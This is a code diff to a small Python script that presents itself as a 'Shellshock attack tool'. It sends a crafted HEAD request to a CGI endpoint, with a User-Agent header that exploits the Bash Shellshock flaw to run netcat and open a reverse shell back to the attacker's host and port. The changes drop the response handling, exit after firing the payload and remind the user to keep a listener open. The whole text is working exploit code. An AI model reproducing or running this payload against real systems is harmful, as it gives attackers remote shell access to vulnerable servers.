@@ -18,7 +18,10 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
    # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argumento
    payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
-   recv_data = s.recv(4096)
+   
+   ''' Don't even need the recv data because the data isn't even coming back to the program... We just fire the payload off that's it '''
+   #recv_data = s.recv(4096)
+   sys.exit("Sent payload, dipping out lol")
    '''
    Need a way to find out if the socket connected successfully or not and then inform the user
    '''
@@ -48,7 +51,7 @@ def main():
     ''' We get this URL from the shellshock_dect tool '''
     target_url = sys.argv[3]
     print("Shellshock attack tool")
-    print("Sending payload")
+    print("Sending payload\nEnsure to have a listener open on {}".format(lport))
     # This is what we pass into the HEAD request which actually performs shellshock
     payload = shellshock_http_req(lhost,lport,'192.168.0.100', 80, target_url)
     print(payload)
